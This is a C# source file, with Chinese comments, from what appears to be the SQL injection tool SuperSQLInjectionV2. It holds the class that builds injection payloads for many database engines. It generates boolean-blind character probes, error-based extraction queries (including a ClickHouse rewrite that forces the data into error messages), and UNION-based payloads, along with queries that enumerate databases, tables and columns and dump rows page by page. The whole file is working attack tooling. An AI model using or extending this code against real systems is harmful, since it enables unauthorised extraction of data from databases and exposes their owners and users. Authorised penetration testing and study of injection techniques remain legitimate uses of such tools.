using SuperSQLInjectionV2.Tools;
using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace SuperSQLInjectionV2.Payload
{
    /// <summary>
    /// 单一模板驱动方言实现：合并原 14 个 PaylaodTool。
    /// 所有取数SQL都由 config/payload/xx.txt 模板（命名占位符，见 <see cref="TemplateRenderer"/>）
    /// + <see cref="DialectOptions"/> 方言开关渲染；库级差异（字面量编码、索引偏移、报错派生表改写）
    /// 通过选项表达，槽位布局差异（有无 {db} 等）由模板自身表达。
    /// </summary>
    public sealed class TemplateDialect : IDbDialect
    {
        private readonly BasePayload bp;
        private readonly DialectOptions opt;

        public TemplateDialect(BasePayload bp, DialectOptions opt)
        {
            this.bp = bp;
            this.opt = opt;
        }

        public BasePayload Payload => bp;

        public DialectOptions Options => opt;

        /// <summary>按方言编码字符串字面量/标识符</summary>
        public static string Encode(string s, LiteralEncoder enc)
        {
            switch (enc)
            {
                case LiteralEncoder.Hex: return TextCodec.StrToHex(s);
                case LiteralEncoder.Chr: return TextCodec.StrToChr(s, "UTF-8");
                case LiteralEncoder.CharBar: return TextCodec.StrToChar(s, "UTF-8", "||");
                case LiteralEncoder.CharPlus: return TextCodec.StrToChar(s, "UTF-8");
                case LiteralEncoder.ChrAmp: return TextCodec.StrToChrOrChar(s, "chr", "&", "UTF-8");
                case LiteralEncoder.ToChar: return "to_char(" + s + ")";
                case LiteralEncoder.Quote: return "'" + s + "'";
                default: return s;
            }
        }

        private string EncDb(string dbName)
        {
            return Encode(opt.UpperDbName ? dbName.ToUpperInvariant (): dbName, opt.IdentEncoder);
        }

        private string EncTable(string tableName)
        {
            string t = opt.UpperTableName ? tableName.ToUpperInvariant (): tableName;
            return opt.QuoteTableName ? "'" + t + "'" : Encode(t, opt.IdentEncoder);
        }

        public string BoolDataValue(string payload, int index)
        {
            payload = TemplateRenderer.Render(bp.Substr, ("expr", payload), ("start", index), ("len", 1));
            return TemplateRenderer.Render(bp.Ascii, ("expr", payload));
        }

        public string CheckBoolData(string payload, int checkValue)
        {
            return TemplateRenderer.Render(bp.BoolData, ("expr", payload), ("value", checkValue));
        }

        public string DataLen(string payload)
        {
            return TemplateRenderer.Render(bp.Length, ("expr", payload));
        }

        public string DataCount(DumpDataParam dp)
        {
            return GetDataCount(dp.DBName, dp.TableName, dp.Where);
        }

        public string GetDataCount(string dbName, string tableName, string where = "")
        {
            return TemplateRenderer.Render(BasePayloadTool.WithoutDbQualifier(bp.DataCount, dbName),
                ("db", dbName), ("table", tableName), ("where", BasePayloadTool.WhereSql(where, false)));
        }

        public string ErrorData(DumpDataParam dp)
        {
            if (opt.ErrorViaDataValue)
            {
                //ClickHouse：DataValue 已把列表达式别名为 _v 的子查询，包派生表物化后再报错取值
                return ErrorData(DataValue(dp));
            }
            return TemplateRenderer.Render(bp.ErrorData, ("cols", ConcatData(dp.Columns)));
        }

        public string ErrorData(string payload)
        {
            if (opt.DerivedTableError)
            {
                return BuildErrorPayload(payload, 0, 0);
            }
            return TemplateRenderer.Render(bp.ErrorData, ("cols", ConcatData(new List<string> { payload })));
        }

        public string ErrorDataSubstr(string paylaod, int start, int end)
        {
            if (opt.DerivedTableError)
            {
                return BuildErrorPayload(paylaod, start, end);
            }
            string newData = TemplateRenderer.Render(bp.Substr, ("expr", paylaod), ("start", start), ("len", end));
            return TemplateRenderer.Render(bp.ErrorData, ("cols", ConcatData(new List<string> { newData })));
        }

        /// <summary>
        /// ClickHouse 26 新分析器对内层标量子查询惰性求值，会把 toInt32 错误吞成 NULL。
        /// 报错取数必须把 toInt32 推进派生表内作用于物化列：子查询类 payload（取数模板均别名 _v）
        /// 改写为 (select toInt32(concat(标记,_v,标记)) from (原子查询))=1；函数类（version等）直接套。
        /// </summary>
        private string BuildErrorPayload(string payload, int chunkStart, int chunkLen)
        {
            string start = "'" + EchoMarkers.Start + "'";
            string split = "'" + EchoMarkers.Split + "'";
            string end = "'" + EchoMarkers.End + "'";
            string p = (payload ?? "").Trim();
            bool isSubquery = p.StartsWith("(select", StringComparison.OrdinalIgnoreCase);
            //length((select...))是取数前的长度预检，同样惰性，转成派生表内 length(_v)
            bool isLenOfSubquery = !isSubquery && Regex.IsMatch(p, @"^length\(\(select .+\)\)$", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            string inner;
            string fromClause = "";
            if (isSubquery)
            {
                string v = "toString(_v)";
                inner = chunkLen > 0 ? $"substring({v},{chunkStart},{chunkLen})" : v;
                fromClause = $" from ({p})";
            }
            else if (isLenOfSubquery)
            {
                string sub = p.Substring("length(".Length, p.Length - "length(".Length - 1);
                inner = "toString(length(_v))";
                fromClause = $" from ({sub})";
            }
            else
            {
                inner = chunkLen > 0
                    ? $"toString(substring({p},{chunkStart},{chunkLen}))"
                    : $"toString({p})";
            }
            return $"(select toInt32(concat({start},{split},{inner},{split},{end})){fromClause})=1";
        }

        public string GetColumnCount(string dbName, string tableName)
        {
            return TemplateRenderer.Render(bp.ColumnCount,
                ("db", EncDb(dbName)), ("table", EncTable(tableName)));
        }

        public string GetColumnName(string dbName, string tableName, int index)
        {
            return TemplateRenderer.Render(bp.ColumnName,
                ("db", EncDb(dbName)), ("table", EncTable(tableName)), ("index", index + opt.EnumIndexOffset));
        }

        public string GetColumnNames(string dbName, string tableName)
        {
            return TemplateRenderer.Render(bp.ColumnNames,
                ("db", EncDb(dbName)), ("table", EncTable(tableName)));
        }

        public string GetDBName(int index)
        {
            return TemplateRenderer.Render(bp.DBName, ("index", index + opt.EnumIndexOffset));
        }

        public string GetTableCount(string dbName)
        {
            return TemplateRenderer.Render(bp.TableCount, ("db", EncDb(dbName)));
        }

        public string GetTableName(string dbName, int index)
        {
            return TemplateRenderer.Render(bp.TableName,
                ("db", EncDb(dbName)), ("index", index + opt.EnumIndexOffset + opt.TableIndexOffset));
        }

        public string GetTableNames(string dbName)
        {
            return TemplateRenderer.Render(bp.TableNames, ("db", EncDb(dbName)));
        }

        public string DataValue(DumpDataParam dp)
        {
            string data = string.Join(",", dp.Columns);
            string template = bp.DataValue;
            string where = BasePayloadTool.WhereSql(dp.Where, false);
            if (StablePaging && !string.IsNullOrWhiteSpace(dp.StableKey))
            {
                if (dp.LastKeyValue != null && bp.PayLoadSQL.TryGetValue("DataValueKeyset", out string? keyset))
                {
                    template = keyset;
                    where = StableWhere(dp);
                }
                else if (bp.PayLoadSQL.TryGetValue("DataValueOrdered", out string? ordered))
                {
                    template = ordered;
                }
            }
            return TemplateRenderer.Render(BasePayloadTool.WithoutDbQualifier(template, dp.DBName),
                ("cols", data), ("db", dp.DBName), ("table", dp.TableName), ("stableKey", dp.StableKey),
                ("rowIndex", dp.DataIndex + opt.DataIndexOffset), ("where", where));
        }

        private static string StableWhere(DumpDataParam dp)
        {
            string condition = dp.StableKey + ">'" + (dp.LastKeyValue ?? "").Replace("'", "''", StringComparison.Ordinal) + "'";
            string custom = (dp.Where ?? "").Trim();
            if (custom.StartsWith("where ", StringComparison.OrdinalIgnoreCase)) custom = custom[6..].Trim();
            if (custom.StartsWith("and ", StringComparison.OrdinalIgnoreCase)) custom = custom[4..].Trim();
            return " where " + (custom.Length > 0 ? "(" + custom + ") and " : "") + condition;
        }

        public bool MinValueChainPaging => opt.MinValueChain;
        public bool StablePaging => bp.PayLoadSQL.ContainsKey("DataValueOrdered") && bp.PayLoadSQL.ContainsKey("DataValueKeyset");

        /// <summary>
        /// MIN 值链取数（Access）：(select min(col) from t [where 用户条件] [and cvar(col)>'last'])。
        /// cvar 转 Variant 后比较，数字/字符串列通用（sqlmap dump_table.blind 同款语义）；
        /// lastValue 单引号转义防闭合
        /// </summary>
        public string DataValueChain(DumpDataParam dp, string? lastValue)
        {
            string data = string.Join(",", dp.Columns);
            var conds = new List<string>();
            string w = (dp.Where ?? "").Trim();
            if (w.StartsWith("where ", StringComparison.OrdinalIgnoreCase)) w = w.Substring(6).Trim();
            if (w.StartsWith("and ", StringComparison.OrdinalIgnoreCase)) w = w.Substring(4).Trim();
            if (w.Length > 0)
            {
                conds.Add("(" + w + ")");
            }
            if (lastValue != null)
            {
                conds.Add("cvar(" + data + ")>'" + lastValue.Replace("'", "''") + "'");
            }
            string where = conds.Count > 0 ? " where " + string.Join(" and ", conds) : "";
            return "(select min(" + data + ") from " + dp.TableName + where + ")";
        }

        /// <summary>distinct 计数（MIN 值链行数口径）：(select count(*) from (select distinct col from t [where]))</summary>
        public string DataCountDistinct(DumpDataParam dp)
        {
            string data = string.Join(",", dp.Columns);
            string where = BasePayloadTool.WhereSql(dp.Where, false);
            return "(select count(*) from (select distinct " + data + " from " + dp.TableName + where + "))";
        }

        public string UnionData(DumpDataParam dp)
        {
            List<string> newColumns = BasePayloadTool.ConcatColumns(dp.Columns, bp.IFNull, dp.NoCast ? "" : bp.Cast);
            string data = ConcatData(newColumns);
            //填充优先级：人工/记录值（dp.UnionFill）> 模板UnionFillStr（对齐sqlmap uChar语义）
            string fill = string.IsNullOrWhiteSpace(dp.UnionFill) ? bp.UnionFillStr : dp.UnionFill;
            string newData = BasePayloadTool.InsertUnionDataToShowIndex(data, dp.SumCount, dp.ShowIndex, fill);
            string template = bp.UnionData;
            string where = BasePayloadTool.WhereSql(dp.Where, false);
            if (StablePaging && !string.IsNullOrWhiteSpace(dp.StableKey))
            {
                if (dp.LastKeyValue != null && bp.PayLoadSQL.TryGetValue("UnionDataKeyset", out string? keyset))
                {
                    template = keyset;
                    where = StableWhere(dp);
                }
                else if (bp.PayLoadSQL.TryGetValue("UnionDataOrdered", out string? ordered))
                {
                    template = ordered;
                }
            }
            return TemplateRenderer.Render(BasePayloadTool.WithoutDbQualifier(template, dp.DBName),
                ("cols", newData), ("db", dp.DBName), ("table", dp.TableName), ("stableKey", dp.StableKey),
                ("rowIndex", dp.DataIndex + opt.DataIndexOffset), ("where", where));
        }

        public string UnionAll(string paylaod, int sumCount, int showIndex, string unionFill = "")
        {
            string data = ConcatData(new List<string> { paylaod });
            string fill = string.IsNullOrWhiteSpace(unionFill) ? bp.UnionFillStr : unionFill;
            string newData = BasePayloadTool.InsertUnionDataToShowIndex(data, sumCount, showIndex, fill);
            return TemplateRenderer.Render(bp.UnionAll, ("cols", newData));
        }

        public string ConcatData(List<string> columns)
        {
            //回显标记走会话级EchoMarkers（注入记录随机标记优先），与解析侧同源
            string split = Encode(EchoMarkers.Split, opt.MarkerEncoder);
            string dataStart = Encode(EchoMarkers.Start, opt.MarkerEncoder);
            string dataEnd = Encode(EchoMarkers.End, opt.MarkerEncoder);
            string data;
            if (opt.SingleColumnCast && columns.Count == 1)
            {
                data = TemplateRenderer.Render(bp.Cast, ("expr", columns[0]));
            }
            else if (opt.JoinWithMarker)
            {
                data = string.Join(opt.ConcatOp + split + opt.ConcatOp, columns);
            }
            else
            {
                //concat_ws 系（MySQL/ClickHouse 多列）：分隔符由模板第一个参数承担，列间只放拼接符
                data = string.Join(opt.ConcatOp, columns);
            }
            return TemplateRenderer.Render(bp.Concat,
                ("split", split), ("startMark", dataStart), ("cols", data), ("endMark", dataEnd));
        }
    }
}
